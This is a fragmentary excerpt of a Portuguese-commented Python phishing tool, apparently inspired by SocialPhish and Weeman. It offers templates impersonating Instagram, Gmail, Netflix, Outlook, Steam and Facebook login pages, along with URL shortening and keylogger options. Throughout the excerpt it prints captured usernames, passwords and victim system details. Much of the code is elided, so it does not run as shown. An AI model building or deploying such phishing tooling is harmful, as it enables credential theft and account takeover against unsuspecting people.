...
Inspiração: SocialPhish, Weeman and Seeker Project
'''
   ...
   for pkg in pkgs:
          ...
          if (present == None):
                  ...
                  if (pkg == "python3" or pkg == "python"):
                    print ("\n" + W + "[" + R + "+" + W + "] " + C + "Use: " + G + "apt install python")
                  elif (pkg == "pip3"):
                    print ("\n" + W + "[" + R + "+" + W + "] " + C + "Use: " + G + "apt install python3-pip")
                  elif (pkg == "php"):
                    print ("\n" + W + "[" + R + "+" + W + "] " + C + "Use: " + G + "apt install php")
                  elif (pkg == "curl"):
                    print ("\n" + W + "[" + R + "+" + W + "] " + C + "Use: " + G + "apt install curl")
                  inst = False
          else:
                  pass
   if (inst == False):
...
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█    - [+] Criador : Diego333-ms .:. Versão : 2.1 .:. [+] -    █
█                                                              █
└══════════════════════════════════════════════════════════════┘ ''')
     ...
     while (True):
        ...
        if (not prompt): #Se nada foi digitado, continue a execução
         ...
         try: #Se o usuário digitar show ou show options na posição 0 ou 1 da lista, será exibida a tela de configuração
          ...
          print ("\n" +  C + "Comando:" + W + " show templates " + C + "=> " + G + "exibir templates disponiveis")
          print ("\n" +  C + "Comando:" + W + " show history " + C + "=> " + G + "exibir dados coletados do alvo anterior")
          ...
          print ("\n" +  C + "Templates Disponiveis:" + G + " [instagram] [gmail] [netflix] [outlook] [steam]")
          continue
          ...
          try:
            ...
            if (verificar_action == True):
              ...
              print ("\n" + W + "[" + R + "-" + W + "]" + C + " A URL de Destino %s é inválida. Use como exemplo: " + G + "https://" + C + "www.site.com" %url_action)
              url_action = "Sem URL de Destino ativa"
              time.sleep(4.5)
              banner_program()
              continue
            ...
            if (verificar_action_url == True):
              if (template_phishing == "Sem Template ativo"):
                ...
                if (encurtar_url == "on" and keylogger == "on" or encurtar_url == "ON" and keylogger == "ON"):
                  ...
                  break
                elif (encurtar_url == "off" and keylogger == "off" or encurtar_url == "OFF" and keylogger == "ON"):
                  os.system("touch config_log.txt")
                  arquivo = open("config_log.txt","w")
                  arquivo.write(template_phishing + "\n")
                  arquivo.write(str(porta))
           ...
           if (server.status_code == 200): #Se o Encurtamento for bem sucedido, retornará o resultado ao usuário
             ...
             while (True):
               ...
               if (verificar_network == True):
                 ...
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Versão do Sistema: " + G + "%s" %versao_sistema)
                 arquivo_rede.close()
                 print ("\n" +  W + "--------------------------------------")
           ...
           if (server.status_code == 200): #Se o Encurtamento for bem sucedido, retornará o resultado ao usuário
             ...
             while (True):
               ...
               if (verificar_network == True):
                 ...
                 usuario = str(conteudo_dados[1])
                 senha = str(conteudo_dados[3])
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Usuário Steam: " + G + "%s" %usuario)
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Senha: " + G + "%s" %senha)
                 arquivo_dados.close()
                 time.sleep(1.2)
   ...
   while (True):
        ...
        if (not prompt):
         ...
         try:
          ...
          try:
            template_phishing = str(prompt[2])
            if (template_phishing == "instagram" or template_phishing == "facebook" or template_phishing == "gmail" or template_phishing == "outlook" or template_phishing == "steam"):
              continue
            else:
              print ("\n" + W + "[" + R + "-" + W + "]" + C + " O Template %s é inválido" %template_phishing)
              template_phishing = "Sem Template ativo"
